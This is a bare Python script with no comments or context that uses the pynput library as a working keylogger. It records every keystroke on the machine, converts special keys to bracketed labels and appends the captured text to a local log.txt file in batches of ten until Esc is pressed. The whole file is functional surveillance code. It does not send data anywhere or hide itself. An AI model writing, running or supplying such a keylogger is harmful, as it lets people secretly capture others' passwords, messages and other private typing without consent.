from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    if count >= 10:
        write_file(keys)
        keys = []
        count = 0


def write_file(keys):
    with open("log.txt", "a", encoding="utf-8") as f:
        for key in keys:
            if key == Key.space:
                f.write(" ")

            elif key == Key.enter:
                f.write("\n")

            elif key == Key.backspace:
                f.write("[BACKSPACE]")

            elif key == Key.tab:
                f.write("[TAB]")

            elif key == Key.shift:
                f.write("[SHIFT]")

            elif key == Key.shift_r:
                f.write("[SHIFT_R]")

            elif key == Key.ctrl_l:
                f.write("[CTRL_L]")

            elif key == Key.ctrl_r:
                f.write("[CTRL_R]")

            elif key == Key.alt_l:
                f.write("[ALT_L]")

            elif key == Key.alt_r:
                f.write("[ALT_R]")

            elif hasattr(key, "char") and key.char is not None:
                f.write(key.char)

            else:
                f.write("[{0}]".format(key))


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
